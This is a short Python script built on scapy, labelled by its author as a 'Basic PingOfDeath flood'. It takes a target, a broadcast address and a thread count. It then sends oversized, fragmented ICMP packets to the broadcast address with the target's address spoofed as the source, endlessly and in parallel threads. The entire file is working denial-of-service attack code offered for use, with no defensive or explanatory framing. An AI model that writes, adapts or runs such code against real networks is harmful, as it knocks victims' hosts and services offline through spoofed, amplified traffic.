#!/usr/bin/env python
from scapy.all import *
import sys
import threading
import time
import os

os.system('clear||cls')


if len(sys.argv) < 2:
	print "Usage: <target> <broadcast IP> <threads>"
	#dont put threads too high
	print "Basic PingOfDeath flood by Khanejo"
	sys.exit()

host = sys.argv[1]
reflect = sys.argv[2]
numberthreads = int(sys.argv[3])
threads = []

def flood():
	global host
	global reflect
	
	ping_of_death = IP(dst=reflect,src=host)/ICMP()/("X" * 60000)
	
	send(fragment(ping_of_death), loop=1)

for n in range(numberthreads):
	t = threading.Thread(target=flood)
	t.daemon = True
	t.start()
	threads.append(t)

while True:
	time.sleep(1)
